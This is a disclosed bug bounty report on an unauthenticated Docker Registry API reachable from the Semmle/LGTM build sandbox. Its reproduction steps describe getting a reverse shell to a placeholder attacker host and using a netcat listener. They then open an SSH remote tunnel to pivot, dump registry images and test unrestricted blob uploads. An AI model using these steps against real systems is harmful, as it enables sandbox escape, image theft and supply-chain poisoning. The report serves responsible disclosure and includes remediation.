---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-access-control-generic
  - env/cloud
  - stack/docker
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2020-06-06
submitted: 2018-05-04T00:33:58.671Z
bounty_usd: null
votes: 83
cve: []
program: "[[programs/semmle|Semmle]]"
reporter: "thehackerish"
source: "https://hackerone.com/reports/347296"
title: "Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning"
---
# Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 83 | **Program:** Semmle | **Disclosed:** 2020-06-06

- Report: [https://hackerone.com/reports/347296](https://hackerone.com/reports/347296)
- CWE: Improper Access Control - Generic
- Submitted: 2018-05-04T00:33:58.671Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Docker Registry HTTP API v2 is exposed in HTTP without authentication. An attacker can use it to dump your docker images and poison them.

**Description:**
While digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the `lgtm/top` repository. I didn't try to upload anything because I didn't want to alter your docker images.

## Steps To Reproduce:

  1. Create a GitHub repository that has the attached file, name it .lgtm.yml and modify `ATTACKER_HOST` and `ATTACKER_PORT` to yours.
  2. set up a netcat listener: `nc -vlp ATTACKER_PORT`
  3. Add the project to lgtm, it should start building it. After some time, you should get a reverse shell.
  4. Make a remote SSH tunnel from the build container `ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N`
  5. Enter your attacker password and a SSH tunnel should be up.
  6. Using the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.
  7. Additionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string `/v2/<name>/blobs/uploads/`. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.

**NOTE**: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a **sandbox escape**

## Supporting Material/References:

  *A writeup about the vulnerability in a pentest:  https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
  *The Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload

## Remediation:
1. Implement authentication to the service.
2. Use HTTPS
3. Limit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)

## Impact

An attacker can use it to dump your docker images and poison them.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **2018-05-04** @thehackerish: Thank you for your fast feedback and for the bounty. The only reason for my pivoting was that RCE on the build was accepted behaviour. But I tried to escape from it as mentioned in your policy.
Once again, thank you for your prompt collaboration. You're doing a great job!

Can I blog about it without mentioning anything about you?
- **2018-05-04** @thehackerish: I also noticed you have a whitelist that limits users from installing arbitrary packages on the sandbox. Can I report a way to bypass it? Actually, I used the same bypass to install packages that helped me find the exposed Docker Registry Api.
- **Report Resolved**
- **2018-05-08** @jmdh: @hackerish as the attack is fairly specific to what we're doing we would like to review a draft of a blog post before you publish it. Would this work for you? Feel free to email this to us at bug-bounty@semmle.com.
- **2018-05-08** @thehackerish: @jmdh thank you very much for your feedback. I will start working on it whenever I have time. I'll let you have a look at it when it is ready.
- **Agreed On Going Public**
- **Report Became Public**
